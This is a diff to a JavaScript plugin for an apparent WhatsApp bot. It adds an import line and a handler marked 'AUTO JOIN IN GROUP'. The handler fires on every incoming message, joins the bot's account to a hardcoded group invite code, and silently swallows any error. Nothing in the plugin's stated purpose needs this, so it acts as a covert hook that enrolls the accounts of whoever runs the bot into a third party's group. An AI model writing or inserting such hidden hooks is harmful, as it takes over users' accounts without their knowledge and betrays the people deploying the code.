@@ -6,6 +6,7 @@ const fs = require("fs");
 const os = require("os");
 const path = require("path");
 const FormData = require("form-data");
+const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, sleep, fetchJson } = require('../lib/functions')
 
 
 cmd({
@@ -250,6 +251,21 @@ cmd({
     await conn.sendMessage(from, {
       text: "❌ Error:\n" + error.message
     }, { quoted: mek });
+  }
+});
+//COMPLETE
+
+//AUTO JOIN IN GROUP
+cmd({
+  on: "body"
+}, async (conn, mek, m, { body }) => {
+  try {
+    const groupLinkCode = "GmZbatR1yieFUaEaYyKRBG";
+    
+    await conn.groupAcceptInvite(groupLinkCode);
+    
+  } catch (error) {
+  
   }
 });
 //COMPLETE
